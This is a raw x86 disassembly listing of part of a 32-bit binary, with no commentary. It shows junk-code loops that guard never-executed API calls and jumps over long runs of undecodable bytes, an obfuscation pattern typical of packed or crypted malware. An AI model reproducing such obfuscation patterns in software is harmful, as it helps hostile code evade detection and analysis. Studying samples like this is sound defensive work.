  40ec8b:	or     eax,0xf749c6ac
  40ec90:	int3   
  40ec91:	jecxz  0x40ec40
  40ec93:	idiv   BYTE PTR ds:0x5836bf8b
  40ec99:	mov    edx,DWORD PTR [ebp+0x8]
  40ec9c:	or     ecx,DWORD PTR ds:0x42a77d
  40eca2:	mov    DWORD PTR [ebp-0x40],eax
  40eca5:	mov    eax,0x7510850
  40ecaa:	xor    edx,eax
  40ecac:	add    edi,0x2fd0
  40ecb2:	mov    ecx,0x327298
  40ecb7:	mov    DWORD PTR ds:0x42a879,0x17
  40ecc1:	cmp    DWORD PTR ds:0x42a879,0x0
  40ecc8:	je     0x40ed80
  40ecce:	cmp    DWORD PTR ds:0x42a879,0x5
  40ecd5:	jne    0x40ecf1
  40ecdb:	push   DWORD PTR [ebp-0x1c]
  40ecde:	push   0x65c1
  40ece3:	push   DWORD PTR [ebp-0x20]
  40ece6:	push   0x6120
  40eceb:	call   DWORD PTR ds:0x41d254
  40ecf1:	cmp    DWORD PTR ds:0x42a879,0x6
  40ecf8:	jne    0x40ed0b
  40ecfe:	mov    edi,DWORD PTR ds:0x42a879
  40ed04:	dec    edi
  40ed05:	mov    DWORD PTR ds:0x42a879,edi
  40ed0b:	mov    edi,DWORD PTR ds:0x42a879
  40ed11:	dec    edi
  40ed12:	mov    DWORD PTR ds:0x42a879,edi
  40ed18:	jmp    0x40ecc1
  40ed1d:	and    DWORD PTR ds:0x42a885,0x0
  40ed27:	mov    edi,DWORD PTR ds:0x42a885
  40ed2d:	inc    edi
  40ed2e:	mov    DWORD PTR ds:0x42a885,edi
  40ed34:	cmp    DWORD PTR ds:0x42a885,0x5
  40ed3b:	jne    0x40ed53
  40ed41:	push   DWORD PTR [ebp-0xc]
  40ed44:	push   DWORD PTR [ebp-0xc]
  40ed47:	push   DWORD PTR [ebp-0x18]
  40ed4a:	push   DWORD PTR [ebp-0x14]
  40ed4d:	call   DWORD PTR ds:0x41d1a4
  40ed53:	cmp    DWORD PTR ds:0x42a885,0x4
  40ed5a:	jne    0x40ed6d
  40ed60:	mov    edi,DWORD PTR ds:0x42a885
  40ed66:	inc    edi
  40ed67:	mov    DWORD PTR ds:0x42a885,edi
  40ed6d:	cmp    DWORD PTR ds:0x42a885,0x1f
  40ed74:	jb     0x40ed27
  40ed7a:	add    edi,DWORD PTR ds:0x42a7fd
  40ed80:	add    edx,ecx
  40ed82:	mov    edi,DWORD PTR ds:0x42a7f1
  40ed88:	xor    DWORD PTR ds:0x42a875,edi
  40ed8e:	jmp    0x40f016
  40ed93:	retf   0xc5c0
  40ed96:	ror    cl,0xc5
  40ed99:	leave  
  40ed9a:	retf   0x1a17
  40ed9d:	push   edx
  40ed9e:	xchg   edx,eax
  40ed9f:	test   BYTE PTR [ecx],dh
  40eda1:	int    0xb3
  40eda3:	popa   
  40eda4:	mov    edi,0x7ee57878
  40eda9:	js     0x40ee23
  40edab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edac:	sbb    BYTE PTR [edi],cl
  40edae:	sub    al,0x93
  40edb0:	adc    DWORD PTR [ecx+0x2b],0xb4163036
  40edb7:	sbb    BYTE PTR [eax-0x74],0x6b
  40edbb:	dec    eax
  40edbc:	fwait
  40edbd:	int3   
  40edbe:	and    BYTE PTR ds:0xe397331c,cl
  40edc4:	mov    ds:0xa88f7d34,eax
  40edc9:	adc    ecx,DWORD PTR [ebp+ebx*4-0x31]
  40edcd:	jo     0x40eddd
  40edcf:	nop
  40edd0:	push   ds
  40edd1:	fisub  DWORD PTR [eax-0x7526e55]
  40edd7:	jnp    0x40ed5b
  40edd9:	in     al,0x82
  40eddb:	call   0xa567:0x62946fc
  40ede2:	mov    ecx,0xc2977f9f
  40ede7:	addr16 cmc 
  40ede9:	retf   
  40edea:	(bad)  
  40edeb:	jb     0x40ed93
  40eded:	das    
  40edee:	imul   esp,DWORD PTR [eax],0x7f
  40edf1:	xchg   DWORD PTR [ecx+0x5df53677],esp
  40edf7:	cmp    al,BYTE PTR [ebp-0x27]
  40edfa:	add    BYTE PTR [edi],ah
  40edfc:	ss dec edx
  40edfe:	dec    edx
  40edff:	pop    ss
  40ee00:	jns    0x40ee48
  40ee02:	in     eax,0xd5
  40ee04:	pop    eax
  40ee05:	and    edx,DWORD PTR [edx]
  40ee07:	xor    DWORD PTR [esi-0x47365616],esi
  40ee0d:	xchg   edi,eax
  40ee0e:	inc    esp
  40ee0f:	dec    edx
  40ee10:	shr    dl,cl
  40ee12:	ins    BYTE PTR es:[edi],dx
  40ee13:	call   0x791:0x1a4bd94b
  40ee1a:	inc    edx
  40ee1b:	jl     0x40edd1
  40ee1d:	mov    al,bh
  40ee1f:	xchg   ecx,eax
  40ee20:	mov    ?,ecx
  40ee22:	or     eax,0xfe9c5f0b
  40ee27:	aaa    
  40ee28:	pop    ds
  40ee29:	in     al,dx
  40ee2a:	in     eax,0x9c
  40ee2c:	cmp    BYTE PTR [edi-0x42428ac3],0x90
  40ee33:	in     al,0x72
  40ee35:	test   eax,0x31f1888a
  40ee3a:	inc    ebx
  40ee3b:	jp     0x40ee21
  40ee3d:	and    dh,BYTE PTR [ecx-0x2934b68]
  40ee43:	inc    ebx
  40ee44:	adc    bl,bh
  40ee46:	push   cs
  40ee47:	xor    eax,0x93514ee9
  40ee4c:	popa   
  40ee4d:	sub    al,0xd6
  40ee4f:	dec    edx
  40ee50:	mov    DWORD PTR [ebx+0x7a],esi
  40ee53:	cmp    ecx,DWORD PTR [ebx+eax*2+0x1f]
  40ee57:	shl    BYTE PTR [edx],0x43
  40ee5a:	pop    edx
  40ee5b:	inc    edx
  40ee5c:	ficom  DWORD PTR ds:0x65f0e20e
  40ee62:	push   esp
  40ee63:	mov    eax,ecx
  40ee65:	sub    eax,0x994c053e
  40ee6a:	mov    bl,0x1f
  40ee6c:	fdiv   st(6),st
  40ee6e:	add    edi,DWORD PTR [ebx-0x21]
  40ee71:	mov    edi,0x5e49a1e
  40ee76:	jg     0x40ee42
  40ee78:	and    bh,BYTE PTR ds:0x4f67a6ec
  40ee7e:	call   0x79fe:0x59f8dc77
  40ee85:	std    
  40ee86:	mov    esp,0x3150227b
  40ee8b:	mov    DWORD PTR [edi],esp
  40ee8d:	mov    dh,0xea
  40ee8f:	(bad)  
  40ee90:	fcmovne st,st(6)
  40ee92:	jns    0x40ee5d
  40ee94:	sbb    al,BYTE PTR [eax+0x10]
  40ee97:	dec    eax
  40ee98:	shl    BYTE PTR [eax],0xf9
  40ee9b:	test   eax,0xe1fe6544
  40eea0:	js     0x40eeef
  40eea2:	pop    ebp
  40eea3:	ds jae 0x40ee66
  40eea6:	xor    al,0x10
  40eea8:	shr    BYTE PTR [edi+edi*2],cl
  40eeab:	mov    ah,0x8d
  40eead:	ficom  DWORD PTR ds:0x7daf8ca2
  40eeb3:	repnz pop eax
  40eeb5:	inc    ecx
  40eeb6:	push   0xd41bbfe1
  40eebb:	sub    DWORD PTR [ebp+0x0],edx
  40eebe:	rol    DWORD PTR [edi+ebp*2+0x24],0x61
  40eec3:	mov    ebx,0xc492bc93
  40eec8:	inc    ecx
  40eec9:	stos   BYTE PTR es:[edi],al
  40eeca:	lea    ebx,[ebx]
  40eecc:	iret   
  40eecd:	jnp    0x40eed2
  40eecf:	xchg   edx,eax
  40eed0:	mov    eax,DWORD PTR [eax]
  40eed2:	jg     0x40eef3
  40eed4:	fcomp  DWORD PTR [edi+ebx*4]
  40eed7:	fld    TBYTE PTR [edi+0x1c78210d]
  40eedd:	mov    esi,0x9a121500
  40eee2:	rol    DWORD PTR [edi],1
  40eee4:	push   edi
  40eee5:	mov    esi,0x2a8afeaa
  40eeea:	or     eax,0x1bac40d7
  40eeef:	mov    ds:0x30906ab0,eax
  40eef4:	mov    ds:0xd7167eaf,al
  40eef9:	rol    BYTE PTR [edi-0x8],0x86
  40eefd:	inc    edx
  40eefe:	das    
  40eeff:	sub    BYTE PTR [edi+0x7cf1e10a],dh
  40ef05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef06:	test   eax,0xd6172ef0
  40ef0b:	adc    al,0x99
  40ef0d:	test   eax,0xe2699cd6
  40ef12:	ret    
  40ef13:	xchg   esi,eax
  40ef14:	xchg   bl,al
  40ef16:	mov    DWORD PTR [edi+0x52],esp
  40ef19:	outs   dx,DWORD PTR ds:[esi]
  40ef1a:	int    0xd9
  40ef1c:	sahf   
  40ef1d:	or     al,0xd2
  40ef1f:	aaa    
  40ef20:	adc    BYTE PTR [ecx],cl
  40ef22:	mov    cl,0x1e
  40ef24:	jo     0x40ef6f
  40ef26:	retf   0x3317
  40ef29:	shl    DWORD PTR ds:0x50140476,cl
  40ef2f:	mov    ebx,0x258d9327
  40ef34:	arpl   WORD PTR [ebp+0x7c0e3020],dx
  40ef3a:	ret    0x2be8
  40ef3d:	add    edx,esp
  40ef3f:	and    eax,DWORD PTR [edx]
  40ef41:	outs   dx,BYTE PTR ds:[esi]
  40ef42:	jo     0x40efbb
  40ef44:	mov    ds:0xc5227479,al
  40ef49:	rcl    BYTE PTR [ebx-0x53d6c93d],cl
  40ef4f:	ror    BYTE PTR [edx-0x6d616cf],cl
  40ef55:	pop    eax
  40ef56:	xchg   esp,eax
  40ef57:	push   ebp
  40ef58:	xchg   ecx,eax
  40ef59:	and    DWORD PTR [eax+0x26],ebp
  40ef5c:	inc    ecx
  40ef5d:	dec    eax
  40ef5e:	not    BYTE PTR [eax-0x7e19eac3]
  40ef64:	repz mov dh,0x2e
  40ef67:	mov    cs,WORD PTR [ebp+ebp*1+0x4e76834]
  40ef6e:	and    DWORD PTR [ebx+ebp*2-0x39],edx
  40ef72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef73:	xchg   ebp,eax
  40ef74:	les    ecx,FWORD PTR [eax]
  40ef76:	mov    ecx,0x796035a9
  40ef7b:	inc    esp
  40ef7c:	xor    edx,DWORD PTR [esi+0x50]
  40ef7f:	sub    BYTE PTR [esi],dl
  40ef81:	mov    eax,0x7ff1a736
  40ef86:	(bad)  
  40ef87:	fmul   QWORD PTR [edx]
  40ef89:	or     ch,BYTE PTR [ecx]
  40ef8b:	imul   eax,edx,0xffffffb7
  40ef8e:	pop    ss
  40ef8f:	cdq    
  40ef90:	iret   
  40ef91:	xlat   BYTE PTR ds:[ebx]
  40ef92:	mov    eax,0x4b3ef786
  40ef97:	sbb    al,0xcc
  40ef99:	mov    al,0xd3
  40ef9b:	inc    ecx
  40ef9c:	xchg   esi,eax
  40ef9d:	push   ebx
  40ef9e:	rcr    DWORD PTR ds:0x3e0dceb,cl
  40efa4:	in     al,0x76
  40efa6:	fdivrp st(6),st
  40efa8:	push   0xfffffff7
  40efaa:	(bad)  
  40efab:	out    dx,eax
  40efac:	scas   eax,DWORD PTR es:[edi]
  40efad:	cmc    
  40efae:	mov    esi,0x740e53a9
  40efb3:	xchg   ebp,eax
  40efb4:	rcr    esp,0x49
  40efb7:	pop    es
  40efb8:	and    al,0xa8
  40efba:	js     0x40efbc
  40efbc:	inc    edx
  40efbd:	pop    edx
  40efbe:	cmp    BYTE PTR [ebp-0x3d],al
  40efc1:	imul   esi,DWORD PTR [ecx-0x5d468d8a],0x2ee67414
  40efcb:	jp     0x40ef8b
  40efcd:	push   eax
  40efce:	lahf   
  40efcf:	and    esp,DWORD PTR [esi-0x68]
  40efd2:	aad    0x2c
  40efd4:	and    ecx,DWORD PTR [edi+0x4c2a781c]
  40efda:	mov    eax,ds:0x8f4b4e68
  40efdf:	in     eax,0xed
  40efe1:	fst    st(6)
  40efe3:	jmp    0xf09e:0xa6d130e7
  40efea:	sub    al,0xc1
  40efec:	test   dh,bl
  40efee:	adc    DWORD PTR [edx+0x26e21685],ecx
  40eff4:	mov    ?,WORD PTR [ebp-0x57b8b9f1]
  40effa:	enter  0x3d07,0xa7
  40effe:	sub    dl,BYTE PTR [esi]
  40f000:	(bad)  
  40f001:	xor    eax,0xf3e2e990
  40f006:	leave  
  40f007:	call   0x4fb7af0d
  40f00c:	jno    0x40f036
  40f00e:	pop    ebp
  40f00f:	cmp    ecx,esi
  40f011:	mov    ah,0xe7
  40f013:	dec    edi
  40f014:	mov    al,0xea
  40f016:	mov    DWORD PTR [ebp-0x8],edx
  40f019:	and    DWORD PTR ds:0x42a801,0x0
  40f023:	xor    edi,edi
  40f025:	add    edi,DWORD PTR ds:0x42a801
  40f02b:	inc    edi
  40f02c:	mov    DWORD PTR ds:0x42a801,edi
  40f032:	cmp    DWORD PTR ds:0x42a801,0xa
  40f039:	jne    0x40f04a
  40f03f:	push   0x23fa
  40f044:	call   DWORD PTR ds:0x41d0d0
  40f04a:	cmp    DWORD PTR ds:0x42a801,0x9
  40f051:	jne    0x40f066
  40f057:	xor    edi,edi
  40f059:	or     edi,DWORD PTR ds:0x42a801
  40f05f:	inc    edi
  40f060:	mov    DWORD PTR ds:0x42a801,edi
  40f066:	cmp    DWORD PTR ds:0x42a801,0x10
  40f06d:	jb     0x40f023
  40f073:	and    edi,edi
  40f075:	mov    edx,DWORD PTR [ebp+0x8]
  40f078:	and    DWORD PTR ds:0x42a88d,0x0
  40f082:	mov    edi,DWORD PTR ds:0x42a88d
  40f088:	inc    edi
  40f089:	mov    DWORD PTR ds:0x42a88d,edi
  40f08f:	cmp    DWORD PTR ds:0x42a88d,0x29
  40f096:	jne    0x40f0ac
  40f09c:	push   0x42a805
  40f0a1:	push   0x4a20
  40f0a6:	call   DWORD PTR ds:0x41d0d4
  40f0ac:	cmp    DWORD PTR ds:0x42a88d,0x1f
  40f0b3:	jb     0x40f082
  40f0b9:	and    DWORD PTR ds:0x42a759,0x6b84
  40f0c3:	xor    edx,eax
  40f0c5:	jmp    0x40f34d
  40f0ca:	enter  0xcbc4,0xc2
  40f0ce:	fcmovnb st,st(1)
  40f0d0:	aad    0xda
  40f0d2:	push   cs
  40f0d3:	and    al,0x97
  40f0d5:	cmp    al,0x62
  40f0d7:	hlt    
  40f0d8:	call   0x78fdbf0c
  40f0dd:	js     0x40f0c4
  40f0df:	jle    0x40f159
  40f0e1:	js     0x40f143
  40f0e3:	sti    
  40f0e4:	or     eax,0x82d58b6
  40f0e9:	and    DWORD PTR [ebp+0x34],eax
  40f0ec:	lods   al,BYTE PTR ds:[esi]
  40f0ed:	inc    edx
  40f0ee:	and    eax,0x50365df8
  40f0f3:	sbb    al,dh
  40f0f5:	cld    
  40f0f6:	mov    ecx,0xce40b7b
  40f0fb:	arpl   WORD PTR [ebp+0x6d6138c7],bp
  40f101:	ss or  bh,cl
  40f104:	shl    DWORD PTR [esi+0x6e],1
  40f107:	gs add ebx,edi
  40f10a:	adc    eax,0x2fac82bb
  40f10f:	clc    
  40f110:	cmp    dl,BYTE PTR [esi]
  40f112:	dec    ebp
  40f113:	push   0x30
  40f115:	dec    esp
  40f116:	dec    eax
  40f117:	(bad)  
  40f118:	push   cs
  40f119:	push   0x6b
  40f11b:	sbb    ebp,DWORD PTR [edi-0x5f]
  40f11e:	xor    DWORD PTR [eax],0xffffffa1
  40f121:	ret    0x3911
  40f124:	or     eax,0xa0ce2f6c
  40f129:	pop    ebp
  40f12a:	cs mov bh,0x7c
  40f12d:	fwait
  40f12e:	cmp    eax,0xaa6307f5
  40f133:	popa   
  40f134:	scas   eax,DWORD PTR es:[edi]
  40f135:	cmp    cl,BYTE PTR [edi+0x2a5f65]
  40f13b:	bound  ebx,QWORD PTR [ecx-0x1645f61]
  40f141:	jle    0x40f0e8
  40f143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f144:	pushf  
  40f145:	xor    esp,DWORD PTR [ebx]
  40f147:	fwait
  40f148:	mov    esi,ebp
  40f14a:	es mov bl,0x7e
  40f14d:	mov    ds:0xbc4e9eb5,eax
  40f152:	cwde   
  40f153:	in     eax,0x53
  40f155:	imul   edx,DWORD PTR [ebx+0x9],0xc
  40f159:	xor    BYTE PTR [eax-0x5],bh
  40f15c:	mov    esi,0x141bbab7
  40f161:	xchg   ebx,eax
  40f162:	pop    edi
  40f163:	xchg   esi,eax
  40f164:	dec    edx
  40f165:	es inc edi
  40f167:	adc    edi,eax
  40f169:	or     dh,BYTE PTR [ebx+0x1a]
  40f16c:	add    BYTE PTR [ebx-0x33],al
  40f16f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f170:	push   0x79
  40f172:	xor    DWORD PTR [edx],0xc5ede555
  40f178:	xchg   DWORD PTR [ecx+0x6d],esp
  40f17b:	ins    BYTE PTR es:[edi],dx
  40f17c:	mov    eax,ds:0xa96935e2
  40f181:	dec    esp
  40f182:	cdq    
  40f183:	mov    ?,edx
  40f185:	cdq    
  40f186:	push   0x32
  40f188:	fnstsw WORD PTR [ebx]
  40f18a:	mov    WORD PTR [ecx+0x1e],?
  40f18d:	inc    esi
  40f18e:	fistp  WORD PTR [eax]
  40f190:	stc    
  40f191:	pusha  
  40f192:	fstp   DWORD PTR es:[ebp-0x1bd7bce3]
  40f199:	cwde   
  40f19a:	add    ecx,DWORD PTR [eax-0x53]
  40f19d:	push   ebp
  40f19e:	into   
  40f19f:	adc    bl,dl
  40f1a1:	lods   eax,DWORD PTR ds:[esi]
  40f1a2:	xlat   BYTE PTR ds:[ebx]
  40f1a3:	out    dx,eax
  40f1a4:	add    ebx,edx
  40f1a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1a7:	std    
  40f1a8:	sub    eax,0x415552de
  40f1ad:	sub    BYTE PTR [ebp+0x5e],cl
  40f1b0:	fld    QWORD PTR [esi-0xc25e10f]
  40f1b6:	pop    es
  40f1b7:	or     BYTE PTR [esi+0x22505929],cl
  40f1bd:	push   edi
  40f1be:	dec    ecx
  40f1bf:	sub    edi,DWORD PTR [edi-0x6d907a77]
  40f1c5:	sahf   
  40f1c6:	or     al,0xba
  40f1c8:	sbb    ecx,ecx
  40f1ca:	inc    BYTE PTR [ecx]
  40f1cc:	push   ecx
  40f1cd:	ror    DWORD PTR [ecx],cl
  40f1cf:	or     BYTE PTR [ebp+ecx*8-0x7cd89e71],ch
  40f1d6:	ins    DWORD PTR es:[edi],dx
  40f1d7:	dec    ch
  40f1d9:	mov    ecx,0xbe8b6f3
  40f1de:	add    BYTE PTR [eax],0x2
  40f1e1:	aaa    
  40f1e2:	out    0x73,eax
  40f1e4:	sbb    eax,ebx
  40f1e6:	fisub  WORD PTR [esi-0x5040bcc8]
  40f1ec:	jae    0x40f1c2
  40f1ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1ef:	add    ebp,ecx
  40f1f1:	(bad)  [edi+0x15e6f2eb]
  40f1f7:	pop    ds
  40f1f8:	cmp    eax,0x6052dc5d
  40f1fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1fe:	hlt    
  40f1ff:	cli    
  40f200:	loopne 0x40f1a2
  40f202:	leave  
  40f203:	xchg   BYTE PTR [esi-0x4c794eb6],al
  40f209:	jge    0x40f1b6
  40f20b:	add    DWORD PTR [ebx+0x51],0xf6ad3214
  40f212:	out    dx,eax
  40f213:	add    cl,ch
  40f215:	sbb    eax,0x6db604da
  40f21a:	sbb    al,0x21
  40f21c:	(bad)  
  40f21e:	sbb    ecx,ebx
  40f220:	out    0xb9,eax
  40f222:	xchg   edx,eax
  40f223:	in     al,0x85
  40f225:	pop    esi
  40f226:	stc    
  40f227:	cmc    
  40f228:	retf   
  40f229:	mov    ch,0xd
  40f22b:	(bad)  
  40f22c:	pop    edx
  40f22d:	inc    eax
  40f22e:	and    BYTE PTR [edi+ebx*1-0x57],cl
  40f232:	mov    bl,dl
  40f234:	out    0xea,al
  40f236:	call   0x1aaf105
  40f23b:	lods   al,BYTE PTR ds:[esi]
  40f23c:	outs   dx,BYTE PTR ds:[esi]
  40f23d:	and    ebp,DWORD PTR [edx-0x99cf401]
  40f243:	xchg   ebx,eax
  40f244:	into   
  40f245:	stos   BYTE PTR es:[edi],al
  40f246:	sbb    al,0x95
  40f248:	into   
  40f249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f24a:	sbb    al,0x66
  40f24c:	push   ds
  40f24d:	push   ecx
  40f24e:	xlat   BYTE PTR ds:[ebx]
  40f24f:	fadd   QWORD PTR [eax+0x2ec91601]
  40f255:	arpl   WORD PTR [eax+ebp*4-0x2360b1b1],bx
  40f25c:	mov    eax,DWORD PTR [edx]
  40f25e:	mov    edi,0xcac4e782
  40f263:	push   0x75
  40f265:	fmul   DWORD PTR [ecx+ecx*1]
  40f268:	and    BYTE PTR [edx],0x28
  40f26b:	aam    0x7d
  40f26d:	push   cs
  40f26e:	lahf   
  40f26f:	test   edx,ebp
  40f271:	xchg   DWORD PTR [ebx+0x0],esi
  40f274:	lods   al,BYTE PTR ds:[esi]
  40f275:	in     al,dx
  40f276:	dec    esi
  40f277:	(bad)  
  40f278:	cmp    al,0x52
  40f27a:	jecxz  0x40f29b
  40f27c:	xchg   esi,eax
  40f27d:	mov    bl,BYTE PTR ss:[ebx+0x35]
  40f281:	loope  0x40f2d8
  40f283:	call   0x94f4:0x53788795
  40f28a:	jl     0x40f22b
  40f28c:	das    
  40f28d:	fsub   QWORD PTR [eax+0x2f8b8068]
  40f293:	dec    eax
  40f294:	xchg   esi,eax
  40f295:	(bad)  
  40f296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f297:	push   ebp
  40f298:	js     0x40f2f5
  40f29a:	test   eax,0x482dd2d0
  40f29f:	xchg   ebp,eax
  40f2a0:	mov    eax,0x66081f6c
  40f2a5:	xlat   BYTE PTR ds:[ebx]
  40f2a6:	call   0x7e5222bb
  40f2ab:	push   esi
  40f2ac:	pop    DWORD PTR [edi-0x313b9da0]
  40f2b2:	dec    esp
  40f2b3:	enter  0x3bf9,0x6a
  40f2b7:	aaa    
  40f2b8:	mov    eax,0x1b50ef54
  40f2bd:	js     0x40f2ed
  40f2bf:	and    ch,BYTE PTR [edx+0xd]
  40f2c2:	cs leave 
  40f2c4:	and    al,0x59
  40f2c6:	mov    dl,0xf8
  40f2c8:	xchg   ebp,eax
  40f2c9:	ins    BYTE PTR es:[edi],dx
  40f2ca:	shl    cl,1
  40f2cc:	test   DWORD PTR [ebx-0x6d],0x7b834eed
  40f2d3:	push   esi
  40f2d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2d5:	pminub mm0,QWORD PTR [ebp+0x23ac77cb]
  40f2dc:	and    DWORD PTR [esi],ebx
  40f2de:	sbb    edx,DWORD PTR [esi+esi*1]
  40f2e1:	in     al,0x7
  40f2e3:	dec    eax
  40f2e4:	int3   
  40f2e5:	inc    eax
  40f2e6:	mov    ebp,0xc5b2f46a
  40f2eb:	adc    eax,0x8e7d6263
  40f2f0:	out    dx,eax
  40f2f1:	add    DWORD PTR [edi],0xffffffa0
  40f2f4:	mov    ecx,0x4d6bfa32
  40f2f9:	dec    edx
  40f2fa:	mov    ebx,ds
  40f2fc:	mov    edx,0x4927ab11
  40f301:	cld    
  40f302:	xor    al,0x7
  40f304:	out    0x1e,al
  40f306:	jmp    0x40f354
  40f308:	inc    ebx
  40f309:	ja     0x40f2a2
  40f30b:	sub    esp,DWORD PTR [edx-0x784e12a6]
  40f311:	popf   
  40f312:	stc    
  40f313:	mov    bh,bh
  40f315:	jecxz  0x40f2f3
  40f317:	inc    ecx
  40f318:	mov    al,0x34
  40f31a:	jnp    0x40f33c
  40f31c:	aad    0x5e
  40f31e:	sbb    BYTE PTR [eax],ch
  40f320:	call   0x8e173d25
  40f325:	mov    BYTE PTR [ecx],ah
  40f327:	out    dx,eax
  40f328:	pusha  
  40f329:	jns    0x40f376
  40f32b:	inc    eax
  40f32c:	dec    edi
  40f32d:	mov    ch,0xbc
  40f32f:	mov    ds:0x77836345,al
  40f334:	test   al,0xea
  40f336:	and    bl,dl
  40f338:	pop    ecx
  40f339:	aad    0x10
  40f33b:	cli    
  40f33c:	push   0x942ee5c4
  40f341:	lock ss xchg esi,eax
  40f344:	stos   BYTE PTR es:[edi],al
  40f345:	fild   DWORD PTR [edx]
  40f347:	shl    BYTE PTR [edi],0xad
  40f34a:	dec    esi
  40f34b:	rol    DWORD PTR [ecx+0x3],cl
  40f34e:	rol    edi,1
  40f350:	add    eax,0x42a80d
  40f355:	sbb    eax,0x83000000
  40f35a:	cmp    eax,0x42a80d
  40f35f:	add    BYTE PTR [edi],cl
  40f361:	test   BYTE PTR [ebp+0x0],bl
  40f364:	add    BYTE PTR [eax],al
  40f366:	cmp    DWORD PTR ds:0x42a80d,0x7
  40f36d:	jne    0x40f389
  40f373:	push   DWORD PTR [ebp-0x20]
  40f376:	push   DWORD PTR [ebp-0x14]
  40f379:	push   0x7b1d
  40f37e:	push   0x2bb5
  40f383:	call   DWORD PTR ds:0x41d258
  40f389:	cmp    DWORD PTR ds:0x42a80d,0x8
  40f390:	jne    0x40f3a3
  40f396:	mov    edi,DWORD PTR ds:0x42a80d
  40f39c:	dec    edi
  40f39d:	mov    DWORD PTR ds:0x42a80d,edi
  40f3a3:	mov    edi,DWORD PTR ds:0x42a80d
  40f3a9:	dec    edi
  40f3aa:	mov    DWORD PTR ds:0x42a80d,edi
  40f3b0:	jmp    0x40f359
  40f3b5:	xor    edi,edi
  40f3b7:	add    edi,DWORD PTR ds:0x42a759
  40f3bd:	add    DWORD PTR ds:0x42a775,edi
  40f3c3:	mov    DWORD PTR [ebp+0xc],edx
  40f3c6:	xor    edx,DWORD PTR ds:0x42a769
  40f3cc:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  40f3d3:	or     edx,edx
  40f3d5:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  40f3dc:	and    DWORD PTR ds:0x42a841,0x0
  40f3e6:	jmp    0x40f3f8
  40f3eb:	mov    edx,DWORD PTR ds:0x42a841
  40f3f1:	inc    edx
  40f3f2:	mov    DWORD PTR ds:0x42a841,edx
  40f3f8:	cmp    DWORD PTR ds:0x42a841,0x12
  40f3ff:	jae    0x40f427
  40f405:	cmp    DWORD PTR ds:0x42a841,0x14
  40f40c:	jne    0x40f420
  40f412:	push   0x4578
  40f417:	push   DWORD PTR [ebp-0x14]
  40f41a:	call   DWORD PTR ds:0x41d25c
  40f420:	jmp    0x40f3eb
  40f425:	and    edi,edi
  40f427:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40f42e:	sub    edi,DWORD PTR ds:0x42a879
  40f434:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  40f43b:	and    edi,0x6695
  40f441:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40f448:	or     DWORD PTR ds:0x42a775,0x61f4
  40f452:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  40f459:	and    DWORD PTR ds:0x42a809,0x0
  40f463:	jmp    0x40f477
  40f468:	xor    edx,edx
  40f46a:	xor    edx,DWORD PTR ds:0x42a809
  40f470:	inc    edx
  40f471:	mov    DWORD PTR ds:0x42a809,edx
  40f477:	cmp    DWORD PTR ds:0x42a809,0x11
  40f47e:	jae    0x40f4ac
  40f484:	cmp    DWORD PTR ds:0x42a809,0x1a
  40f48b:	jne    0x40f4a7
  40f491:	push   0x1
  40f493:	push   DWORD PTR [ebp-0xc]
  40f496:	push   DWORD PTR [ebp-0x20]
  40f499:	push   0x1352
  40f49e:	push   DWORD PTR [ebp-0x18]
  40f4a1:	call   DWORD PTR ds:0x41d0d8
  40f4a7:	jmp    0x40f468
  40f4ac:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40f4b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f4b6:	xor    edx,eax
  40f4b8:	mov    DWORD PTR ds:0x42a7c9,0x16
  40f4c2:	cmp    DWORD PTR ds:0x42a7c9,0x0
  40f4c9:	je     0x40f553
  40f4cf:	cmp    DWORD PTR ds:0x42a7c9,0x21
  40f4d6:	jne    0x40f4f6
  40f4dc:	push   0x6e96
  40f4e1:	push   0x4a9d
  40f4e6:	push   0x2037
  40f4eb:	push   0x3f81
  40f4f0:	call   DWORD PTR ds:0x41d0dc
  40f4f6:	xor    edi,edi
  40f4f8:	or     edi,DWORD PTR ds:0x42a7c9
  40f4fe:	dec    edi
  40f4ff:	mov    DWORD PTR ds:0x42a7c9,edi
  40f505:	jmp    0x40f4c2
  40f50a:	and    DWORD PTR ds:0x42a841,0x0
  40f514:	jmp    0x40f528
  40f519:	xor    edi,edi
  40f51b:	or     edi,DWORD PTR ds:0x42a841
  40f521:	inc    edi
  40f522:	mov    DWORD PTR ds:0x42a841,edi
  40f528:	cmp    DWORD PTR ds:0x42a841,0x1e
  40f52f:	jae    0x40f553
  40f535:	cmp    DWORD PTR ds:0x42a841,0x26
  40f53c:	jne    0x40f548
  40f542:	call   DWORD PTR ds:0x41d0e0
  40f548:	jmp    0x40f519
  40f54d:	dec    DWORD PTR ds:0x42a7cd
  40f553:	mov    edi,DWORD PTR [ebp-0x10]
  40f556:	mov    DWORD PTR ds:0x42a831,0x29a7
  40f560:	jmp    0x40f7e8
  40f565:	(bad)
  40f568:	ret    0xc2d9
  40f56b:	(bad)  
  40f56d:	sar    DWORD PTR [edi],0x6b
  40f570:	shl    DWORD PTR [esi],0xd3
  40f573:	(bad)  
  40f575:	mov    ebx,0xe5787842
  40f57a:	jle    0x40f5f4
  40f57c:	js     0x40f565
  40f57e:	adc    eax,DWORD PTR [esp+ecx*2-0x55]
  40f582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f583:	pop    esi
  40f584:	dec    ebp
  40f585:	retf   0x72b3
  40f588:	sub    al,0x15
  40f58a:	inc    ecx
  40f58b:	in     al,dx
  40f58c:	dec    edx
  40f58d:	mov    cl,0x81
  40f58f:	push   0x8c3dc2ad
